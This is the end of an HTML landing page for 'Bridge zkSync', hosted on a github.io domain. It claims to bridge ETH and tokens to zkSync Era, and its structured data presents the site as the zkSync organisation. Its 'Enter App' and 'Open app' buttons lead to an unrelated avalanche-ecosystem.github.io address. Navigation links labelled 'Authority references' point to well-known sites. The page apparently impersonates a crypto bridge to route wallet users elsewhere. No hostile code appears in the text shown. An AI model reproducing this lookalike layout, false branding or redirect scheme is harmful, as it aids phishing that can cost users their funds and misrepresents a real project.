  <meta name="twitter:title" content="Bridge zkSync">
  <meta name="twitter:description" content="Bridge zkSync moves ETH and tokens between Ethereum and the zkSync Era L2 from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://bridge-zksync.github.io/#website",
        "url": "https://bridge-zksync.github.io/",
        "name": "Bridge zkSync",
        "inLanguage": "en"
      },
      {
        "@type": "WebApplication",
        "@id": "https://bridge-zksync.github.io/#app",
        "name": "Bridge zkSync",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://bridge-zksync.github.io/",
        "offers": {
          "@type": "Offer",
          "price": "0",
          "priceCurrency": "USD"
        }
      },
      {
        "@type": "Organization",
        "@id": "https://bridge-zksync.github.io/#org",
        "name": "zkSync",
        "url": "https://bridge-zksync.github.io/",
        "sameAs": [
          "https://zksync.io/"
        ]
      }
    ]
  }

</head>
<body>
  <header class="topbar">
    <a class="brand" href="#" aria-label="Bridge zkSync">
      <img src="favicon.png" width="28" height="28" alt="">
      <span>Bridge zkSync</span>
    </a>
    <nav class="nav" aria-label="Authority references">
      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
      <a href="https://l2beat.com/scaling/projects/zksync-era" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
    </nav>
    <span class="spacer" aria-hidden="true"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">Bridge zkSync</h1>
      <p class="sub"><strong>Bridge zkSync</strong> moves ETH and tokens between Ethereum and the zkSync Era L2 from your own wallet.</p>
    </section>

    <section class="card" aria-label="Bridge route">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img class="icon" src="eth.png" width="28" height="28" alt="Ethereum">
            <span class="token">Ethereum</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch bridge direction">
          <span aria-hidden="true">&#8594;</span>
        </button>
        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img class="icon" src="zksync.png" width="28" height="28" alt="zkSync">
            <span class="token">zkSync</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
    </section>
  </main>

  <footer class="footer">
    <b>Bridge zkSync</b> &mdash; 2026
  </footer>

  <script>
  (function () {
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length < 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
    });
  })();
  </script>
</body>
</html>
